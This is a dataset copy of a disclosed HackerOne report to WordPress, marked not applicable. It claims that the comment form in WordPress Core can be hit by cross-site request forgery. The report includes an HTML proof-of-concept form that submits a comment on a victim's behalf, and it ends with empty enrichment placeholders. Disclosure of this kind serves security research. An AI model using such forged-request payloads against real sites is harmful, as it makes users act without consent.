---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '914232'
original_report_id: '914232'
title: CSRF on comment post
weakness: Cross-Site Request Forgery (CSRF)
team_handle: wordpress
created_at: '2020-07-02T17:11:35.356Z'
disclosed_at: '2020-07-16T11:14:43.361Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 3
asset_identifier: WordPress Core
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF on comment post

## Metadata

- HackerOne Report ID: 914232
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: wordpress
- Disclosed At: 2020-07-16T11:14:43.361Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

Hi Wordpress,

I just found an CSRF on comment post. It allow attacker make victim comments on a post.

## Steps To Reproduce:
Attacker send to victim a link with content below:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/wordpress/wordpress-5.4.2/wordpress/wp-comments-post.php" method="POST">
      <input type="hidden" name="comment" value="csrf&#95;comment" />
      <input type="hidden" name="submit" value="Post&#32;Comment" />
      <input type="hidden" name="comment&#95;post&#95;ID" value="29" />
      <input type="hidden" name="comment&#95;parent" value="0" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

Video poc: {F891759}

## Impact

Attacker make victim comments on a post.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
